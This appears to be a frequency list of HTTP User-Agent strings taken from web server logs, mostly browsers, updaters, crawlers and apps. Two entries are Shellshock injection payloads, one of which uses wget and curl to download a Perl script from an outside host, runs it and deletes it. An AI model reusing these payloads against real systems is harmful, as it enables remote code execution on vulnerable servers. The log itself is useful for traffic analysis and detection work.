+6;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
+6;Mozilla/4.0 (compatible; qip4301; QSI1; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+6;Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+6;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.16 (KHTML, like Gecko) Version/8.0 Safari/537.16
+6;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.1 Lightning/4.0.5.1
+6;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+6;Picasa/3.9.138.151 (gzip)
+6;samsung GT-I9190 SyncML_DM Client
+6;THL W200; MIUI/4.3.14_region98
+6;www.probethenet.com scanner
+607;IPM
+61;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.6.0 Lightning/4.0.6
+616;ut_core BenchHttp (ver:41372)
+619;�������� 2.3.
+62;QipGuard 2.7.3
+62;WebTroubleshootingService
+624;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+63292;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36 OPR/35.0.2066.68
+6411;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; )
+644601;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+6470;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
+6483;TXUpdater v. 2.2.4.1203 / Windows 0x1DB10106
+65;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)
+65;PCU
+65210;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 OPR/35.0.2066.37
+6552;MRAICQ 8.3 (build 7317) +79818203015 icq
+66;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) 8bfbc53c-3363-4c85-bd5c-3e9ec42bf632
+67658;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 OPR/35.0.2066.37
+68;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+682017;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+6883;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36 OPR/32.0.1948.69
+689;WicaAgent
+698;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2)
+7;APUpdater/3.14.0 (2d6f5)
+7;Breakpad/1.0 (Windows)
+7;Java/1.6.0_37
+7;m2 note; 5.1; Flyme OS 4.5.4.1I; ru-ru
+7;Mozilla/4.0 (compatible; qippda)
+7;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+7;Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
+7;okhttp/2.7.2
+7;the beast
+7;WP
+70;Mozilla/4.0 (compatible; qip7000; Windows NT 5.1)
+70;OndemandCM Winhttp Download
+700;Microsoft NCSI
+72;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
+72;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/538.1 (KHTML, like Gecko) Droid4X Safari/538.1
+7233;uTorrent/345(109814512)(41712)
+73;Microsoft-WebDAV-MiniRedir/5.1.2600
+7380;Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.11
+73915;Mozilla/4.0
+74;Mozilla/4.0 (compatible; qip4983)
+748;Mozilla/5.0 (Windows NT 5.1; rv:42.0) Gecko/20100101 Firefox/42.0
+75;Foxit Reader Updater
+75;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586
+75;MRAICQ 8.3 (build 7317) +79522448300 icq
+75;unused/0 (LT22i 6.2.A.1.100); gzip
+756;Opera autoupdate agent/1.1.11
+76;1.7.3-B/267349/5.0.2
+76;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Excel 11.0.8172; Pro)
+76;VCSoapClient
+77;DXCoreService
+77;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Word 11.0.8172; Pro)
+77;Mozilla/3.0 (compatible; Indy Library)
+77;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.6.0
+78;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.1; .NET CLR 2.0.50727)
+784;Mozilla/5.0 (Windows NT 5.2; rv:27.0) Gecko/20100101 Firefox/27.0
+792;WSLib 1.4 [1, 0, 96, 0]
+8;������� �����
+8;FoxitReaderUpdater
+8;java_installer
+8;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2; Windows-Media-Player/12.0.7601.17514)
+8;Mozilla/4.0 (compatible; qip4983; QSI4; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+8;okhttp/2.3.0
+8;OMSI/2.16.3.201602121455 Java/1.8.0_60
+8;Opera NetInstaller/35.0.2066.68
+8;RestSharp/105.2.3.0
+80279;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36 OPR/34.0.2036.50
+8029;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+807;Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)
+8132;Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0
+82;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Word 11.0.8202; Pro)
+82;uTorrent/345(109813962)(41162)
+8259;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 YaBrowser/15.7.2357.2877 Safari/537.36
+848;BTWebClient/3450(41372)
+85;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://sageandsandgrill.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://sageandsandgrill.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*");'
+85;okhttp/2.4.0
+8534;Apache-HttpClient/UNAVAILABLE (java 1.4)
+857;BTWebClient/3450(41712)
+86;AVGDM-WV7XDX64 160 BUILD=7442 MSI=4855 LOC=RU PRD=RU-F-Free BRD=0-0-0 BRH=def_upg15istrial PKG=692 PKP=0
+87;DownloadHttp1.0.0 (1.0.0)
+88;MD_VersionCheck
+885;CloudSDK
+89;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.1
+9;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("");'
+9;HP Lookup Agent
+9;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko/20100101 Firefox/12.0
+9;Skype� 7.12
+9;Skype Upgrade
+9;SonyLT22i Build/6.2.A.1.100 UpdateCenter/1.3.4.A.0.11
+9;Test Agent
+9;WLMHttpTransport
+90;Mozilla/4.0 (compatible; MSIE 6.0; DynGate)
+91;ocspd/1.0.2
+92410;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+92681;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)
+939;Mozilla/4.0 (compatible; MSIE 8.0.6001.18702; Windows NT 5.1)
+947;BingBar 7.3.132.0
+949;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+95369;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.3539 Safari/537.36
+965;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
+97;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Outlook 11.0.8172; Pro)
+97461;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36 OPR/34.0.2036.50
+98974;Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0
+99;2gis/1.0.0.5247 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
+99;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Office Outlook 11.0.8202; Pro)
+99;Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.00
+9986;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
